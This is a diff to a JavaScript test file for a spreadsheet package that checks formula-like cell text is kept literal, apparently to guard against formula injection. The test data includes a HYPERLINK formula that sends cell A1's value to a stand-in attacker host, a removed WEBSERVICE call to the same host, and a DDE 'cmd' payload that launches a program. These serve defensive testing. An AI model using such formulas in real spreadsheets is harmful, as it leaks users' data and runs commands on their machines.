@@ -138,8 +138,8 @@ describe("@openwork/workbook", () => {
     expect(cellInputFromText("1e3")).toBe(1000);
     expect(cellInputFromText("TRUE")).toBe(true);
     expect(cellInputFromText("FALSE")).toBe(false);
-    expect(cellInputFromText("=SUM(A1:A3)")).toEqual({ formula: "SUM(A1:A3)" });
-    expect(cellInputFromText('=WEBSERVICE("http://attacker.invalid/")')).toBe('=WEBSERVICE("http://attacker.invalid/")');
+    expect(cellInputFromText("=SUM(A1:A3)")).toBe("=SUM(A1:A3)");
+    expect(cellInputFromText('=HYPERLINK("https://attacker.invalid/?v="&A1,"view")')).toBe('=HYPERLINK("https://attacker.invalid/?v="&A1,"view")');
     expect(cellInputFromText("=cmd|' /C calc'!A0")).toBe("=cmd|' /C calc'!A0");
     expect(cellInputFromText("=")).toBe("=");
     expect(cellInputFromText("02134")).toBe("02134");
